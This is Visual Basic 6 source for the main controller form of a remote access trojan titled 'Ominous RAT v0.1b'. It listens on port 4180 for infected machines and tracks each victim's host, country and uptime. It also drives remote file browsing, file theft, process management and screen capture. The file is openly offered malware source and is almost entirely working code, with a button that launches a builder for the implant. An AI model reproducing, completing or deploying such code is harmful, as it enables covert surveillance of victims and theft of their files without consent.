VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{BD0C1912-66C3-49CC-8B12-7B347BF6C846}#12.1#0"; "COC8FC~1.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Ominous RAT v0.1b"
   ClientHeight    =   3345
   ClientLeft      =   150
   ClientTop       =   540
   ClientWidth     =   12120
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3345
   ScaleWidth      =   12120
   StartUpPosition =   3  'Windows Default
   Begin XtremeSkinFramework.SkinFramework skn 
      Left            =   720
      Top             =   0
      _Version        =   786433
      _ExtentX        =   635
      _ExtentY        =   635
      _StockProps     =   0
   End
   Begin VB.CommandButton cmdAbout 
      Caption         =   "About"
      Height          =   255
      Left            =   1440
      TabIndex        =   2
      Top             =   3000
      Width           =   1215
   End
   Begin VB.CommandButton cmdBuild 
      Caption         =   "Build Server"
      Height          =   255
      Left            =   120
      TabIndex        =   1
      Top             =   3000
      Width           =   1215
   End
   Begin MSWinsockLib.Winsock sckConnections 
      Index           =   0
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckListen 
      Left            =   360
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSComctlLib.ListView lvConnections 
      Height          =   2895
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   12135
      _ExtentX        =   21405
      _ExtentY        =   5106
      View            =   3
      MultiSelect     =   -1  'True
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      FullRowSelect   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   0
      NumItems        =   7
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "Connections"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "Server ID"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Text            =   "Host Name"
         Object.Width           =   3528
      EndProperty
      BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   3
         Text            =   "Country"
         Object.Width           =   3528
      EndProperty
      BeginProperty ColumnHeader(5) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   4
         Text            =   "Up Time"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(6) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   5
         Text            =   "Free RAM"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(7) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   6
         Text            =   "Time"
         Object.Width           =   2540
      EndProperty
   End
   Begin VB.Menu mnuCommands 
      Caption         =   "Commands"
      Visible         =   0   'False
      Begin VB.Menu mnuFileManager 
         Caption         =   "File Manager"
      End
      Begin VB.Menu mnuProcessManager 
         Caption         =   "Process Manager"
      End
      Begin VB.Menu a 
         Caption         =   "-"
      End
      Begin VB.Menu mnuScreenCapture 
         Caption         =   "Screen Capture"
      End
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim sData(1 To 100) As String
Dim sDownloading As Boolean
Const sSplit = "#^#"

Public Sub SendData(Data As String)
sckConnections(lvConnections.SelectedItem.Index).SendData Data
End Sub

Private Sub cmdAbout_Click()
frmAbout.Show
End Sub

Private Sub cmdBuild_Click()
frmBuild.Show
End Sub

Private Sub Form_Load()
'With skn
'    .ApplyWindow Me.hWnd
'    .LoadSkin App.Path & "\Resources\Human.cjstyles", "NormalOrange.ini"
'End With
'^^Codejock

With sckListen
    .Close
    .LocalPort = "4180"
    .Listen
End With

Dim i As Integer
    For i = 1 To 100
        Load sckConnections(i)
        sckConnections(i).Close
    Next i
End Sub

Private Sub lvConnections_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
If lvConnections.ListItems.Count > 0 Then
    If Button = 2 Then
        PopupMenu mnuCommands
    End If
End If
End Sub

Private Sub mnuFileManager_Click()
frmFileManager.Show
frmFileManager.Caption = frmFileManager.Caption & " - " & Split(lvConnections.SelectedItem.Text, ": ")(1)
End Sub

Private Sub mnuProcessManager_Click()
frmProcessManager.Show
End Sub

Private Sub mnuScreenCapture_Click()
frmScreenCapture.Show
frmScreenCapture.Caption = frmScreenCapture.Caption & " - " & Split(lvConnections.SelectedItem.Text, ": ")(1)
End Sub

Private Sub sckConnections_Close(Index As Integer)
Dim i As Integer
    For i = 1 To lvConnections.ListItems.Count
        If sckConnections(Index).RemoteHostIP = lvConnections.ListItems.Item(i).Text Then
            lvConnections.ListItems.Remove (i)
            sckConnections(Index).Close
            Exit For
        End If
    Next i
End Sub

Private Sub sckConnections_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Dim i As Integer
    For i = 1 To lvConnections.ListItems.Count
        If sckConnections(Index).RemoteHostIP = lvConnections.ListItems.Item(i).Text Then
            lvConnections.ListItems.Remove (i)
            sckConnections(Index).Close
            Exit For
        End If
    Next i
End Sub

Private Sub sckListen_ConnectionRequest(ByVal requestID As Long)
Dim i As Integer
    For i = 1 To lvConnections.ListItems.Count
        If sckListen.RemoteHostIP = lvConnections.ListItems.Item(i).Text Then
            Exit Sub
        End If
    Next i

    For i = 1 To sckConnections.UBound
        If sckConnections(i).State <> sckConnected Then
            With sckConnections(i)
                .Close
                .Accept requestID
                lvConnections.ListItems.Add , , i & ": " & sckListen.RemoteHostIP
            End With
            Exit Sub
        End If
    Next i
End Sub

Private Sub sckConnections_DataArrival(Index As Integer, ByVal bytesTotal As Long)
sckConnections(Index).GetData sData(Index)

Dim i As Integer, x As Integer, FF As Integer
    For i = 1 To lvConnections.ListItems.Count
        If Index = Split(lvConnections.ListItems.Item(i).Text, ": ")(0) Then
            If InStr(sData(Index), "[CONNECTSTATUS]") Then
                lvConnections.ListItems.Item(i).SubItems(1) = Split(sData(Index), sSplit)(1)
                lvConnections.ListItems.Item(i).SubItems(2) = Split(sData(Index), sSplit)(2)
                lvConnections.ListItems.Item(i).SubItems(3) = Split(sData(Index), sSplit)(3)
                lvConnections.ListItems.Item(i).SubItems(4) = Split(sData(Index), sSplit)(4)
                lvConnections.ListItems.Item(i).SubItems(5) = Split(sData(Index), sSplit)(5)
                lvConnections.ListItems.Item(i).SubItems(6) = Split(sData(Index), sSplit)(6)
                
            ElseIf InStr(sData(Index), "[REFRESHDRIVES]") Then
                frmFileManager.cmbDrives.Clear
                For x = 0 To Split(sData(Index), sSplit)(1)
                    frmFileManager.cmbDrives.AddItem Split(sData(Index), "|")(x + 1), x
                Next x
                
            ElseIf InStr(sData(Index), "[CHANGEDRIVES]") Then
                frmFileManager.lstFolders.ListItems.Clear
                For x = 0 To Split(sData(Index), sSplit)(1)
                    frmFileManager.lstFolders.ListItems.Add , , Split(sData(Index), "|")(x + 1)
                Next x
            
            ElseIf InStr(sData(Index), "[CHANGEFOLDER]") Then
                frmFileManager.lstFiles.ListItems.Clear
                For x = 0 To Split(sData(Index), sSplit)(1)
                    frmFileManager.lstFiles.ListItems.Add , , Split(sData(Index), "|")(x + 1)
                Next x
            
            ElseIf InStr(sData(Index), "[FILEINFO]") Then
                FF = FreeFile
                Open App.Path & "\Downloads\" & Split(sData(Index), sSplit)(1) For Binary As #1
                SendData "[STARTDOWNLOAD]"
                sDownloading = True
                
            ElseIf InStr(sData(Index), "[ENDOFFILE]") Then
                Close #1
                frmFileManager.prgManage.Value = 0
                sDownloading = False
                
            ElseIf InStr(sData(Index), "[LOF]") Then
                frmFileManager.prgManage.Max = Split(sData(Index), sSplit)(1)
                
            ElseIf InStr(sData(Index), "[SCREENINFO]") Then
                FF = FreeFile
                Open App.Path & "\Downloads\" & Split(sData(Index), sSplit)(1) For Binary As #1
                sDownloading = True
                
            ElseIf InStr(sData(Index), "[SCREENEND]") Then
                frmScreenCapture.picScreen.Picture = LoadPicture(App.Path & "\Downloads\tmp.bmp")
                sDownloading = False
                
            Else
                If sDownloading = True Then
                    Put #1, , sData(Index)
                    frmFileManager.prgManage.Value = frmFileManager.prgManage.Value + sChunk
                End If
            End If
        End If
    Next i
End Sub

